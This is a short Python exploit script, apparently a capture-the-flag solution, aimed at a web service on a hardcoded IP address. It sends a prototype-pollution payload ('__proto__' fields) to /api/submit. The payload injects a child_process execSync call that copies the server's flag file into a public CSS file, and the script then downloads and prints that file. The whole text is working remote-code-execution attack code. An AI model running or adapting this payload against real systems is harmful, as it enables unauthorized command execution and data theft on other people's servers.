import requests

site = 'http://178.62.96.143:31352'
url1 = site + '/api/submit'

response = requests.post(url1, json={
    "artist.name": "Alex Westaway",
    "__proto__.type": "Text",
    "__proto__.line": "process.mainModule.require('child_process').execSync('cat /app/flag* > /app/static/css/out.css')"
})

url2 = site + '/static/css/out.css'
response2 = requests.get(url2)

print(response2.text)

